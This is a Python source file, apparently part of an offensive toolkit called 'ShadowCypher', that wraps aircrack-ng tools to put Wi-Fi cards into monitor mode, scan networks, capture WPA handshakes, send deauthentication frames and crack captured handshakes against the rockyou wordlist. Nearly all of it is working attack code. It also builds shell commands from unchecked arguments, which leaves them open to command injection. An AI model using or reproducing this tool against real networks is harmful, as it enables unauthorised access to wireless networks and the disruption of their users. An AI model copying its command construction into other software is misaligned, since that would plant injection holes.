"""ShadowCypher Wireless Attacks Engine — High-Fidelity Sync (V23.2)."""

import os
import subprocess
from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner

class Wireless:
    """Universal wireless engine. Integrates Airmon-ng, Airodump, and Aireplay."""
    
    @staticmethod
    def list_interfaces_sync():
        """List wireless interfaces synchronously."""
        try:
            return subprocess.check_output("iwconfig 2>/dev/null", shell=True, text=True)
        except:
            return "No wireless interfaces detected."

    @staticmethod
    def enable_monitor(interface, on_output=None, on_complete=None):
        """Put wireless interface into monitor mode."""
        cmd = f"airmon-ng start {interface}"
        runner.execute_task("ENABLE_MONITOR", cmd, callback=on_output)

    @staticmethod
    def disable_monitor(interface, on_output=None, on_complete=None):
        """Take interface out of monitor mode."""
        cmd = f"airmon-ng stop {interface}"
        runner.execute_task("DISABLE_MONITOR", cmd, callback=on_output)

    @staticmethod
    def scan_networks(interface, duration=30, on_output=None, on_complete=None):
        """Scan for wireless networks using airodump-ng."""
        cmd = f"timeout {duration} airodump-ng {interface}"
        runner.execute_task("無線_SCAN", cmd, callback=on_output)

    @staticmethod
    def capture_handshake(interface, bssid, channel, on_output=None, on_complete=None):
        """Capture WPA handshake."""
        cmd = f"airodump-ng -c {channel} --bssid {bssid} -w /tmp/handshake {interface}"
        runner.execute_task("HANDSHAKE_CAPTURE", cmd, callback=on_output)

    @staticmethod
    def deauth(interface, bssid, client=None, count=10, on_output=None, on_complete=None):
        """Send deauthentication frames."""
        client_arg = f"-c {client}" if client else ""
        cmd = f"aireplay-ng -0 {count} -a {bssid} {client_arg} {interface}"
        runner.execute_task("DEAUTH_ATTACK", cmd, callback=on_output)

    @staticmethod
    def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
        """Crack WPA handshake using aircrack-ng."""
        wlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        cmd = f"aircrack-ng -w {wlist} {cap_file}"
        runner.execute_task("WPA_CRACK", cmd, callback=on_output)
